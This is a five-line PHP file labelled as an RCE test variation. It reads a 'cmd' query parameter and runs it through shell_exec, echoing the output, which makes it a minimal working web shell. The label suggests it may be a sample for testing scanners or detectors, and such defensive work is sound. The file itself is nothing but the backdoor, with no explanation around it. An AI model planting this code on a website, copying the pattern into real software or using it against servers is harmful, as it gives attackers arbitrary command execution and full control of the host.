<?php
// RCE test variation #868
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>